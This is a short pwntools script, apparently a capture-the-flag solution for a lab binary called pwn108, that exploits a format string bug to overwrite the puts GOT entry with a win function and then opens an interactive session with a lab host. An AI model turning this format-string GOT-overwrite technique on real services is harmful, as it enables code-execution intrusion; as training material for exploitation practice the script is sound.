# a no-PIE binary with a stack canary. no buffer overflow function.
# solution is to use the format string to overwrite got entry for puts,
# in order to switch to the win function 'holidays'

from pwn import *

exe = context.binary = ELF('./pwn108.elf')

if args.LOCAL:
    p = process()
else:
    p = remote('10.10.159.106',9008)


p.clean()
p.sendline() 
p.clean()

payload = fmtstr_payload(10, {exe.got['puts'] : exe.sym['holidays']})
# write("pwn108payload.txt", payload)
p.sendline(payload)

p.clean()
p.interactive()